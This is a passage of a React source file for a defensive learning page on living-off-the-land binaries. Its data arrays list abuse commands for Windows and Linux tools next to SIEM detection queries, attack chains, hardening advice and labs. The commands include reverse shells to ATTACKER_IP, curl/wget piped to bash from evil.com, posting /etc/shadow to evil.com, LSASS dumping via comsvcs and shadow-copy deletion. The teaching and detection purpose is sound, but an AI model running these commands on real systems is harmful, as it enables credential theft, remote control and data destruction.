      legitimateUse: "Execute DLL export functions",
      mitre: ["T1218.011"],
      abuseMethods: [
        { method: "Execute JavaScript", command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")", risk: "Critical" },
        { method: "Load remote DLL", command: "rundll32.exe \\\\attacker\\share\\payload.dll,EntryPoint", risk: "Critical" },
        { method: "Execute via URL", command: "rundll32.exe url.dll,OpenURL http://evil.com/payload.hta", risk: "High" },
        { method: "Comsvcs MiniDump", command: "rundll32.exe comsvcs.dll,MiniDump <lsass_pid> C:\\temp\\lsass.dmp full", risk: "Critical" },
      ],
      detection: "Monitor rundll32 with network paths, suspicious DLLs (comsvcs, url.dll), or script protocols.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*rundll32.exe*" 
| where match(CommandLine, "(?i)(javascript|\\\\\\\\|comsvcs|MiniDump)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "rundll32.exe"
| where ProcessCommandLine has_any ("javascript:", "comsvcs", "MiniDump", "\\\\\\\\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
    {
      name: "regsvr32.exe",
      path: "C:\\Windows\\System32\\regsvr32.exe",
      legitimateUse: "Register/unregister OLE controls and DLLs",
      mitre: ["T1218.010"],
      abuseMethods: [
        { method: "Execute remote SCT", command: "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll", risk: "Critical" },
        { method: "Local SCT execution", command: "regsvr32 /s /n /u /i:C:\\temp\\payload.sct scrobj.dll", risk: "High" },
        { method: "Squiblydoo", command: "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll", risk: "Critical" },
      ],
      detection: "Monitor regsvr32 with /i flag pointing to URLs or unusual paths. Alert on scrobj.dll usage.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*regsvr32.exe*" 
| where match(CommandLine, "(?i)(/i:|scrobj)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "regsvr32.exe"
| where ProcessCommandLine has_any ("/i:", "scrobj.dll", "http://", "https://")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
    {
      name: "wmic.exe",
      path: "C:\\Windows\\System32\\wbem\\wmic.exe",
      legitimateUse: "WMI command-line interface for system management",
      mitre: ["T1047", "T1057"],
      abuseMethods: [
        { method: "Process creation", command: "wmic process call create \"cmd.exe /c calc.exe\"", risk: "High" },
        { method: "Remote execution", command: "wmic /node:TARGET process call create \"cmd.exe /c payload.exe\"", risk: "Critical" },
        { method: "XSL script execution", command: "wmic os get /format:\"http://evil.com/payload.xsl\"", risk: "Critical" },
        { method: "Shadowcopy deletion", command: "wmic shadowcopy delete /nointeractive", risk: "Critical" },
      ],
      detection: "Monitor wmic with process call create, /node:, /format:, or shadowcopy operations.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*wmic.exe*" 
| where match(CommandLine, "(?i)(process call create|/node:|/format:|shadowcopy)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "wmic.exe"
| where ProcessCommandLine has_any ("process call create", "/node:", "/format:", "shadowcopy")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
    {
      name: "msiexec.exe",
      path: "C:\\Windows\\System32\\msiexec.exe",
      legitimateUse: "Windows Installer for MSI packages",
      mitre: ["T1218.007"],
      abuseMethods: [
        { method: "Remote MSI execution", command: "msiexec /q /i http://evil.com/payload.msi", risk: "Critical" },
        { method: "DLL execution", command: "msiexec /y C:\\path\\to\\payload.dll", risk: "High" },
        { method: "Quiet install from UNC", command: "msiexec /q /i \\\\attacker\\share\\payload.msi", risk: "Critical" },
      ],
      detection: "Monitor msiexec with /i pointing to URLs or UNC paths. Alert on /q (quiet) installations.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image="*msiexec.exe*" 
| where match(CommandLine, "(?i)(http:|\\\\\\\\|/q)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName =~ "msiexec.exe"
| where ProcessCommandLine has_any ("http://", "https://", "\\\\\\\\", "/q")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
    {
      name: "cscript/wscript.exe",
      path: "C:\\Windows\\System32\\cscript.exe",
      legitimateUse: "Windows Script Host for VBS/JS scripts",
      mitre: ["T1059.005", "T1059.007"],
      abuseMethods: [
        { method: "Remote script execution", command: "cscript //E:jscript http://evil.com/payload.js", risk: "Critical" },
        { method: "Encoded command", command: "wscript //B //E:vbscript C:\\temp\\payload.vbs", risk: "High" },
        { method: "ActiveX object abuse", command: "cscript payload.js (creates WScript.Shell)", risk: "High" },
      ],
      detection: "Monitor cscript/wscript with network paths or spawning suspicious child processes.",
      splunkQuery: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 
| search Image IN ("*cscript.exe*", "*wscript.exe*")
| where match(CommandLine, "(?i)(http:|//E:)")
| table _time Computer User Image CommandLine ParentImage`,
      sentinelQuery: `DeviceProcessEvents
| where FileName in~ ("cscript.exe", "wscript.exe")
| where ProcessCommandLine has_any ("http://", "https://", "//E:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
    },
  ];

  // Linux GTFOBins with detailed commands
  const linuxGTFOBins = [
    {
      name: "bash",
      path: "/bin/bash",
      legitimateUse: "Default shell interpreter",
      capabilities: ["Shell", "File read/write", "SUID", "Sudo"],
      abuseMethods: [
        { method: "SUID shell escape", command: "bash -p", risk: "Critical", condition: "When bash has SUID bit" },
        { method: "Reverse shell", command: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", risk: "Critical", condition: "Network access" },
        { method: "Sudo shell", command: "sudo bash", risk: "High", condition: "sudo bash allowed" },
        { method: "Read files", command: "bash -c 'cat /etc/shadow'", risk: "High", condition: "Appropriate permissions" },
      ],
      detection: "Monitor bash spawned with -p flag, reverse shell patterns, or from unusual parent processes.",
    },
    {
      name: "python/python3",
      path: "/usr/bin/python3",
      legitimateUse: "Python interpreter for scripting",
      capabilities: ["Shell", "File read/write", "SUID", "Sudo", "Capabilities"],
      abuseMethods: [
        { method: "Shell escape", command: "python -c 'import os; os.system(\"/bin/bash\")'", risk: "High", condition: "python allowed" },
        { method: "SUID privilege escalation", command: "python -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'", risk: "Critical", condition: "SUID python" },
        { method: "Reverse shell", command: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", risk: "Critical", condition: "Network access" },
        { method: "Sudo shell", command: "sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'", risk: "High", condition: "sudo python allowed" },
        { method: "File read", command: "python -c 'print(open(\"/etc/shadow\").read())'", risk: "High", condition: "Read permissions" },
      ],
      detection: "Monitor python executing os.system, pty.spawn, socket connections, or reading sensitive files.",
    },
    {
      name: "find",
      path: "/usr/bin/find",
      legitimateUse: "Search for files in directory hierarchy",
      capabilities: ["Shell", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Command execution", command: "find . -exec /bin/bash -p \\; -quit", risk: "Critical", condition: "SUID find" },
        { method: "Sudo shell", command: "sudo find . -exec /bin/bash \\; -quit", risk: "High", condition: "sudo find allowed" },
        { method: "Write file", command: "find /tmp -name 'test' -exec cp /bin/bash /tmp/bash \\;", risk: "Medium", condition: "Write access" },
      ],
      detection: "Monitor find with -exec flag, especially spawning shells or modifying files.",
    },
    {
      name: "vim/vi",
      path: "/usr/bin/vim",
      legitimateUse: "Text editor",
      capabilities: ["Shell", "File read/write", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Shell escape", command: "vim -c ':!/bin/bash'", risk: "High", condition: "Interactive vim" },
        { method: "Sudo shell", command: "sudo vim -c ':!/bin/bash'", risk: "High", condition: "sudo vim allowed" },
        { method: "Python shell (vim)", command: "vim -c ':py import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'", risk: "Critical", condition: "SUID vim with python" },
        { method: "File read", command: "vim /etc/shadow", risk: "High", condition: "Read permissions" },
      ],
      detection: "Monitor vim spawning child processes or executing shell commands.",
    },
    {
      name: "tar",
      path: "/bin/tar",
      legitimateUse: "Archive utility",
      capabilities: ["Shell", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Checkpoint command", command: "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash", risk: "Critical", condition: "SUID tar or sudo" },
        { method: "Sudo shell", command: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash", risk: "High", condition: "sudo tar allowed" },
        { method: "Wildcard injection", command: "tar czf archive.tar.gz * (with --checkpoint-action= file in dir)", risk: "High", condition: "Wildcard in script" },
      ],
      detection: "Monitor tar with --checkpoint-action flag, especially executing binaries.",
    },
    {
      name: "nmap",
      path: "/usr/bin/nmap",
      legitimateUse: "Network scanner",
      capabilities: ["Shell", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Interactive mode", command: "nmap --interactive (then !sh)", risk: "High", condition: "nmap < 5.21, SUID" },
        { method: "Script execution", command: "nmap --script=exploit.nse", risk: "Medium", condition: "Custom scripts" },
        { method: "Sudo shell", command: "TF=$(mktemp); echo 'os.execute(\"/bin/bash\")' > $TF; sudo nmap --script=$TF", risk: "High", condition: "sudo nmap allowed" },
      ],
      detection: "Monitor nmap with --interactive or --script pointing to unusual paths.",
    },
    {
      name: "curl",
      path: "/usr/bin/curl",
      legitimateUse: "Transfer data from URLs",
      capabilities: ["File download", "File upload", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Download and execute", command: "curl http://evil.com/payload.sh | bash", risk: "Critical", condition: "Network access" },
        { method: "Exfiltrate files", command: "curl -X POST -d @/etc/passwd http://evil.com/exfil", risk: "High", condition: "Network access" },
        { method: "Write arbitrary files", command: "sudo curl http://evil.com/authorized_keys -o /root/.ssh/authorized_keys", risk: "Critical", condition: "sudo curl -o allowed" },
      ],
      detection: "Monitor curl piped to bash/sh, POST requests to unusual destinations, or writing to sensitive paths.",
    },
    {
      name: "wget",
      path: "/usr/bin/wget",
      legitimateUse: "Download files from the web",
      capabilities: ["File download", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Download and execute", command: "wget -qO- http://evil.com/payload.sh | bash", risk: "Critical", condition: "Network access" },
        { method: "Overwrite file", command: "sudo wget http://evil.com/passwd -O /etc/passwd", risk: "Critical", condition: "sudo wget -O allowed" },
        { method: "Post-data exfil", command: "wget --post-file=/etc/shadow http://evil.com/exfil", risk: "High", condition: "Network access" },
      ],
      detection: "Monitor wget piped to interpreters, -O to sensitive paths, or --post-file usage.",
    },
    {
      name: "socat",
      path: "/usr/bin/socat",
      legitimateUse: "Multipurpose relay for bidirectional data transfer",
      capabilities: ["Shell", "Network", "SUID", "Sudo"],
      abuseMethods: [
        { method: "Reverse shell", command: "socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", risk: "Critical", condition: "Network access" },
        { method: "Bind shell", command: "socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid", risk: "Critical", condition: "Listening allowed" },
        { method: "File transfer", command: "socat -u FILE:/etc/shadow TCP:ATTACKER_IP:PORT", risk: "High", condition: "Network access" },
      ],
      detection: "Monitor socat with EXEC: parameter or unusual network connections.",
    },
    {
      name: "openssl",
      path: "/usr/bin/openssl",
      legitimateUse: "OpenSSL cryptography toolkit",
      capabilities: ["Shell", "Network", "File read"],
      abuseMethods: [
        { method: "Encrypted reverse shell", command: "mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:PORT > /tmp/s; rm /tmp/s", risk: "Critical", condition: "Network access" },
        { method: "File read", command: "openssl enc -in /etc/shadow", risk: "High", condition: "Read permissions" },
        { method: "Base64 encode/decode", command: "openssl enc -base64 -in payload.exe -out payload.txt", risk: "Medium", condition: "File access" },
      ],
      detection: "Monitor openssl s_client connections to unusual hosts or reading sensitive files.",
    },
  ];

  // Real-world attack chains
  const attackChains = [
    {
      name: "Emotet/TrickBot Initial Access",
      description: "Malicious Office document leads to PowerShell execution",
      steps: [
        { step: 1, action: "User opens malicious Word document", binary: "WINWORD.EXE", technique: "T1566.001" },
        { step: 2, action: "Macro executes PowerShell", binary: "powershell.exe", technique: "T1059.001" },
        { step: 3, action: "PowerShell downloads payload", binary: "powershell.exe (IWR)", technique: "T1105" },
        { step: 4, action: "Rundll32 executes DLL", binary: "rundll32.exe", technique: "T1218.011" },
        { step: 5, action: "Scheduled task for persistence", binary: "schtasks.exe", technique: "T1053.005" },
      ],
      detectionOpportunities: [
        "Office app spawning script interpreter",
        "PowerShell with encoded commands or web requests",
        "Rundll32 with unusual DLL paths",
        "Scheduled tasks created from user context",
      ],
    },
    {
      name: "Cobalt Strike Beacon Deployment",
      description: "Typical Cobalt Strike deployment using LOLBins",
      steps: [
        { step: 1, action: "Initial access via phishing", binary: "mshta.exe", technique: "T1218.005" },
        { step: 2, action: "Beacon download", binary: "certutil.exe", technique: "T1105" },
        { step: 3, action: "Execute beacon via rundll32", binary: "rundll32.exe", technique: "T1218.011" },
        { step: 4, action: "Credential dumping", binary: "rundll32.exe + comsvcs.dll", technique: "T1003.001" },
        { step: 5, action: "Lateral movement", binary: "wmic.exe /node:", technique: "T1047" },
      ],
      detectionOpportunities: [
        "MSHTA making network connections",
        "Certutil with -urlcache flag",
        "Rundll32 loading comsvcs.dll with MiniDump",
        "WMIC with /node: parameter",
      ],
    },
    {
      name: "Linux Privilege Escalation Chain",
      description: "Typical Linux privilege escalation using GTFOBins",
      steps: [
        { step: 1, action: "Initial foothold via web shell", binary: "www-data shell", technique: "T1505.003" },
        { step: 2, action: "Enumerate SUID binaries", binary: "find / -perm -4000", technique: "T1083" },
        { step: 3, action: "Exploit SUID python", binary: "python -c 'import os; os.setuid(0);...'", technique: "T1548.001" },
        { step: 4, action: "Add SSH key for persistence", binary: "echo 'key' >> /root/.ssh/authorized_keys", technique: "T1098.004" },
        { step: 5, action: "Install rootkit", binary: "wget + make", technique: "T1014" },
      ],
      detectionOpportunities: [
        "Find command searching for SUID files",
        "Python/perl spawning shells",
        "Modifications to authorized_keys",
        "Unexpected compilation on servers",
      ],
    },
    {
      name: "Ransomware Pre-Deployment",
      description: "Common LOLBin abuse before ransomware execution",
      steps: [
        { step: 1, action: "Disable Windows Defender", binary: "powershell.exe Set-MpPreference", technique: "T1562.001" },
        { step: 2, action: "Delete shadow copies", binary: "wmic shadowcopy delete", technique: "T1490" },
        { step: 3, action: "Stop backup services", binary: "net.exe stop", technique: "T1489" },
        { step: 4, action: "Disable recovery", binary: "bcdedit.exe /set recoveryenabled No", technique: "T1490" },
        { step: 5, action: "Clear event logs", binary: "wevtutil.exe cl", technique: "T1070.001" },
      ],
      detectionOpportunities: [
        "Set-MpPreference disabling features",
        "WMIC shadowcopy delete",
        "BCDedit modifying boot config",
        "Wevtutil clearing logs",
      ],
    },
  ];

  // SIEM Detection Queries
  const siemQueries = {
    splunk: [
      {
        name: "Suspicious Parent-Child Process Chain",
        description: "Detect Office apps spawning script interpreters",
        query: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where match(ParentImage, "(?i)(winword|excel|powerpnt|outlook)\\.exe")
| where match(Image, "(?i)(cmd|powershell|wscript|cscript|mshta)\\.exe")
| stats count by _time Computer User ParentImage Image CommandLine
| where count > 0`,
      },
      {
        name: "LOLBin Network Activity",
        description: "Detect LOLBins making network connections",
        query: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
| where match(Image, "(?i)(certutil|bitsadmin|mshta|regsvr32|rundll32)\\.exe")
| stats count by _time Computer User Image DestinationIp DestinationPort
| sort -count`,
      },
      {
        name: "Encoded PowerShell Commands",
        description: "Detect base64 encoded PowerShell execution",
        query: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where match(Image, "(?i)powershell\\.exe")
| where match(CommandLine, "(?i)(-enc|-encodedcommand|-e\\s)")
| table _time Computer User CommandLine ParentImage`,
      },
      {
        name: "Credential Dumping via Rundll32",
        description: "Detect LSASS dumping using comsvcs.dll",
        query: `index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| where match(Image, "(?i)rundll32\\.exe")
| where match(CommandLine, "(?i)comsvcs.*minidump")
| table _time Computer User CommandLine`,
      },
    ],
    sentinel: [
      {
        name: "Office Spawning Script Engine",
        description: "Detect Office applications spawning potentially malicious processes",
        query: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      },
      {
        name: "LOLBin Download Activity",
        description: "Detect file downloads using built-in tools",
        query: `DeviceProcessEvents
| where FileName in~ ("certutil.exe", "bitsadmin.exe", "curl.exe", "wget.exe")
| where ProcessCommandLine has_any ("http://", "https://", "urlcache", "transfer")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine`,
      },
      {
        name: "Suspicious WMI Activity",
        description: "Detect WMI used for process creation or lateral movement",
        query: `DeviceProcessEvents
| where FileName =~ "wmic.exe"
| where ProcessCommandLine has_any ("process call create", "/node:", "shadowcopy delete")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine`,
      },
      {
        name: "Scheduled Task Creation",
        description: "Detect scheduled tasks created from unusual contexts",
        query: `DeviceProcessEvents
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| where InitiatingProcessFileName !in~ ("mmc.exe", "services.exe", "svchost.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`,
      },
    ],
    elastic: [
      {
        name: "LOLBin Process Creation",
        description: "Detect execution of common LOLBins",
        query: `{
  "query": {
    "bool": {
      "must": [
        { "match": { "event.category": "process" }},
        { "terms": { 
          "process.name": ["certutil.exe", "bitsadmin.exe", "mshta.exe", 
                          "regsvr32.exe", "rundll32.exe", "wmic.exe"]
        }}
      ]
    }
  }
}`,
      },
      {
        name: "Suspicious Command Line Patterns",
        description: "Detect encoded commands and download patterns",
        query: `{
  "query": {
    "bool": {
      "should": [
        { "regexp": { "process.command_line": ".*-enc.*" }},
        { "regexp": { "process.command_line": ".*urlcache.*" }},
        { "regexp": { "process.command_line": ".*DownloadString.*" }}
      ],
      "minimum_should_match": 1
    }
  }
}`,
      },
    ],
  };

  // Hardening recommendations
  const hardeningRecommendations = [
    {
      category: "Application Whitelisting",
      items: [
        { control: "Windows Defender Application Control (WDAC)", description: "Block unsigned/untrusted executables", priority: "Critical" },
        { control: "AppLocker", description: "Restrict script and executable execution by path/publisher", priority: "High" },
        { control: "Software Restriction Policies", description: "Legacy but still useful for older systems", priority: "Medium" },
      ],
    },
    {
      category: "PowerShell Hardening",
      items: [
        { control: "Constrained Language Mode", description: "Limit PowerShell capabilities for non-admins", priority: "High" },
        { control: "Script Block Logging", description: "Log all PowerShell script execution (Event ID 4104)", priority: "Critical" },
        { control: "Module Logging", description: "Log PowerShell module loading", priority: "High" },
        { control: "Transcription", description: "Record all PowerShell I/O to files", priority: "Medium" },
      ],
    },
    {
      category: "Process Monitoring",
      items: [
        { control: "Sysmon", description: "Enhanced process and network monitoring", priority: "Critical" },
        { control: "Command Line Auditing", description: "Enable process command line in Security logs", priority: "Critical" },
        { control: "EDR Solution", description: "Real-time behavioral detection", priority: "Critical" },
      ],
    },
    {
      category: "Network Controls",
      items: [
        { control: "Egress Filtering", description: "Block direct internet access for LOLBins", priority: "High" },
        { control: "DNS Logging", description: "Log all DNS queries for analysis", priority: "High" },
        { control: "Web Proxy", description: "Force traffic through authenticated proxy", priority: "Medium" },
      ],
    },
    {
      category: "Linux Hardening",
      items: [
        { control: "Remove unnecessary SUID bits", description: "find / -perm -4000 and audit", priority: "Critical" },
        { control: "Restrict sudo", description: "Limit sudo to specific commands, no NOPASSWD", priority: "Critical" },
        { control: "auditd rules", description: "Monitor execve, privilege changes, file access", priority: "High" },
        { control: "SELinux/AppArmor", description: "Mandatory access control for processes", priority: "High" },
      ],
    },
  ];

  // Lab exercises
  const labExercises = [
    {
      name: "LOLBin Inventory Lab",
      difficulty: "Beginner",
      duration: "30 minutes",
      objectives: [
        "Identify all LOLBins present on a Windows system",
        "Document their locations and digital signatures",
        "Create a baseline inventory for comparison",
        "Understand which tools are commonly abused",
      ],
      steps: [
        "Use provided PowerShell script to inventory LOLBins",
        "Verify digital signatures using sigcheck",
        "Document findings in structured format",
        "Compare against LOLBAS project database",
      ],
    },
    {
      name: "Detection Rule Development",
      difficulty: "Intermediate",
      duration: "1 hour",
      objectives: [
        "Create Sysmon configuration for LOLBin monitoring",
        "Develop SIEM detection rules for common abuse patterns",
        "Test rules against benign and malicious samples",
        "Tune rules to reduce false positives",
      ],
      steps: [
        "Deploy Sysmon with SwiftOnSecurity config",
        "Create queries for certutil download detection",
        "Test against known-good admin usage",
        "Document tuning rationale and exceptions",
      ],
    },
    {
      name: "Attack Chain Simulation",
      difficulty: "Intermediate",
      duration: "1.5 hours",
      objectives: [
        "Simulate Emotet-style attack chain in lab",
        "Generate logs at each stage of the attack",
        "Validate detection coverage across the chain",
        "Identify gaps in visibility",
      ],
      steps: [
        "Set up isolated Windows VM with Sysmon",
        "Execute macro -> PowerShell -> rundll32 chain",
        "Collect and analyze generated logs",
        "Map detections to MITRE ATT&CK",
      ],
    },
    {
      name: "Linux GTFOBins Audit",
      difficulty: "Beginner",
      duration: "45 minutes",
      objectives: [
        "Enumerate SUID binaries on Linux system",
        "Identify dangerous sudo configurations",
        "Check for GTFOBins that could be abused",
        "Recommend hardening measures",
      ],
      steps: [
        "Run find command to locate SUID binaries",
        "Review /etc/sudoers for dangerous entries",
        "Cross-reference with GTFOBins database",
        "Document findings and remediation steps",
      ],
    },
    {
      name: "AppLocker/WDAC Bypass Testing",
      difficulty: "Advanced",
      duration: "2 hours",
      objectives: [
        "Deploy AppLocker in audit mode",
        "Test common bypass techniques",
        "Understand limitations of allowlisting",
        "Develop compensating controls",
      ],
      steps: [
        "Configure AppLocker with default rules",
        "Attempt execution via LOLBin proxies",
        "Document successful and blocked attempts",
        "Enhance policy to address gaps",
      ],
    },
    {
      name: "Threat Hunt: LOLBin Abuse",
      difficulty: "Advanced",
      duration: "2 hours",
      objectives: [
        "Hunt for LOLBin abuse in historical logs",
        "Develop hunting hypotheses",
        "Create reusable hunting queries",
        "Document investigation playbook",
      ],
      steps: [
        "Formulate hypothesis based on threat intel",
        "Query SIEM for suspicious LOLBin patterns",
        "Pivot on findings to identify scope",
        "Create automated hunt schedule",
      ],
    },
  ];

  const guardrails = [
    "Only test systems you own or have explicit written authorization to assess.",
    "Confirm scope, time window, and escalation contacts before testing.",
    "Do not attempt destructive actions unless explicitly approved.",
    "Keep evidence and logs for reproducibility and reporting.",
    "Coordinate with operations teams before testing production endpoints.",
  ];

  const beginnerPath = [
    "1) Learn the core terms: LOLBins, GTFOBins, LOTL, signed binaries.",
    "2) Inventory built-in tools on a lab system and note their locations.",
    "3) Map what each tool is normally used for (admin vs developer vs user).",
    "4) Review available logs and controls (allowlisting, EDR, audit logs).",
    "5) Document risky paths and propose fixes or detection ideas.",
  ];

  const glossary = [
    { term: "LOLBins", desc: "Living Off the Land Binaries - legitimate binaries that can be abused for attack objectives." },
    { term: "LOLBas", desc: "Living Off the Land Binaries and Scripts - Windows-focused project cataloging abuse methods." },
    { term: "GTFOBins", desc: "Get The F* Out Bins - Linux binaries that can be misused when misconfigured." },
    { term: "LOTS", desc: "Living Off Trusted Scripts - using scripting engines like PowerShell or bash." },
    { term: "Proxy execution", desc: "Using a trusted binary to launch untrusted code, bypassing controls." },
    { term: "Signed binary", desc: "Vendor-signed tools trusted by OS policies and security software." },
    { term: "SUID", desc: "Set User ID - Linux permission allowing execution as file owner (often root)." },
    { term: "UAC Bypass", desc: "Techniques to elevate privileges without triggering UAC prompt." },
  ];
  const learningObjectives = [
    "Explain LOTL in simple terms and why attackers use it.",
    "Identify high-risk built-in tools across Windows, Linux, and macOS.",
    "Recognize suspicious usage patterns and common detection signals.",
    "Run safe inventory commands and capture evidence for reporting.",
    "Recommend hardening steps that reduce LOLBin abuse.",
    "Map LOLBin techniques to MITRE ATT&CK framework.",
    "Write SIEM detection queries for common abuse patterns.",
    "Understand real-world attack chains using LOLBins.",
  ];
  const commonMisconceptions = [
    {
      myth: "If it is signed by Microsoft or Apple, it is always safe.",
      reality: "Signed tools are legitimate, but they can still be misused for malicious purposes.",
    },
    {
      myth: "Disabling PowerShell stops LOTL attacks.",
      reality: "Attackers can use dozens of other built-in binaries and scripting engines.",
    },
    {
      myth: "Living off the land means no malware.",
      reality: "It means fewer custom tools and more use of built-in capabilities.",
    },
    {
      myth: "EDR will catch all LOLBin abuse.",
      reality: "Behavioral detection is challenging when actions appear legitimate.",
    },
    {
      myth: "Application whitelisting solves the problem.",
      reality: "LOLBins are often whitelisted by default as system components.",
    },
  ];
  const beginnerSignals = [
    "Unusual parent process chains (browser or Office launching admin tools).",
    "Commands executed from user temp folders or downloads.",
    "Scheduled tasks or cron entries created outside normal change windows.",
    "Admin tools running with non-admin users.",
    "Outbound network requests from tools that usually work offline.",
    "Encoded or obfuscated command-line arguments.",
    "Tools executing from non-standard paths.",
    "Sequential execution of multiple LOLBins.",
  ];
  const safeDataPoints = [
    "Full command line arguments",
    "Parent and child process relationships",
    "User account and logon context",
    "Binary path and file hash",
    "Network destination (if any) and time",
    "Digital signature status",
    "Process integrity level",
    "Associated scheduled tasks or services",
  ];

  // macOS LOLBins table
  const macTable = [
    { bin: "osascript", category: "Automation", signal: "Scripts launched by browsers or office apps" },
    { bin: "launchctl", category: "Persistence", signal: "New agents in user launch directories" },
    { bin: "plutil", category: "Config", signal: "Modified plist files for login items" },
    { bin: "defaults", category: "Config", signal: "Unexpected preference changes" },
    { bin: "security", category: "Keychain", signal: "Keychain access from unusual parents" },
    { bin: "curl", category: "Transfer", signal: "Downloads to temp or user library paths" },
    { bin: "python/python3", category: "Scripting", signal: "Interpreter spawning shells or network activity" },
    { bin: "bash/zsh", category: "Shell", signal: "Shells spawned by non-terminal apps" },
  ];

  return (
    <LearnPageLayout pageTitle="Living off the Land (LOLBAS/GTFOBins)" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: "#0a0d18", py: 4 }}>
      <Container maxWidth="lg">
        <Chip
          component={Link}
          to="/learn"
          icon={<ArrowBackIcon />}
          label="Back to Learning Hub"
          clickable
          variant="outlined"
          sx={{ borderRadius: 2, mb: 2 }}
        />

        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <TerminalIcon sx={{ fontSize: 42, color: "#f97316" }} />
          <Typography
            variant="h3"
            sx={{
              fontWeight: 700,
              background: "linear-gradient(135deg, #f97316 0%, #fb7185 100%)",
              backgroundClip: "text",
              WebkitBackgroundClip: "text",
              color: "transparent",
            }}
          >
            Living off the Land (LOLBAS/GTFOBins)
          </Typography>
        </Box>
        <Typography variant="h6" sx={{ color: "grey.400", mb: 2 }}>
          Learn what living off the land means, why it is effective, and how to detect risky use of built-in tools.
        </Typography>
        <Paper sx={{ p: 2.5, mb: 3, bgcolor: "#0c0f1c", borderRadius: 2 }}>
          <Typography variant="body1" sx={{ color: "grey.300", mb: 1 }}>
            Living off the land means using tools that are already installed on a computer instead of bringing in
            new malware or custom binaries. Attackers like it because these tools are trusted and often used by
            administrators, so the activity can blend into normal operations.
          </Typography>
          <Typography variant="body2" sx={{ color: "grey.400" }}>
            This page focuses on safe, beginner-friendly discovery and detection. You will learn how to inventory
            built-in tools, understand common misuse patterns, and write clear notes for remediation.
          </Typography>
        </Paper>
        <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
          <Chip icon={<SecurityIcon />} label="LOLBins" size="small" />
          <Chip icon={<SearchIcon />} label="Discovery" size="small" />
          <Chip icon={<BuildIcon />} label="Defense and Logging" size="small" />
          <Chip icon={<WarningIcon />} label="Misuse Patterns" size="small" />
        </Box>

        <Paper sx={{ bgcolor: "#111424", borderRadius: 2 }}>
          <Tabs
            value={tabValue}
            onChange={(_, v) => setTabValue(v)}
            variant="scrollable"
            scrollButtons="auto"
            sx={{
              borderBottom: "1px solid rgba(255,255,255,0.08)",
              "& .MuiTab-root": { color: "grey.400" },
              "& .Mui-selected": { color: "#f97316" },
            }}
          >
            <Tab icon={<SecurityIcon />} label="Overview" />
            <Tab icon={<TerminalIcon />} label="Windows LOLBAS" />
            <Tab icon={<TerminalIcon />} label="Linux GTFOBins" />
            <Tab icon={<TerminalIcon />} label="macOS LOTL" />
            <Tab icon={<BugReportIcon />} label="Attack Chains" />
            <Tab icon={<CodeIcon />} label="SIEM Queries" />
            <Tab icon={<ShieldIcon />} label="Hardening" />
            <Tab icon={<SchoolIcon />} label="Labs" />
          </Tabs>

          <TabPanel value={tabValue} index={0}>
            <Box sx={{ p: 3 }}>
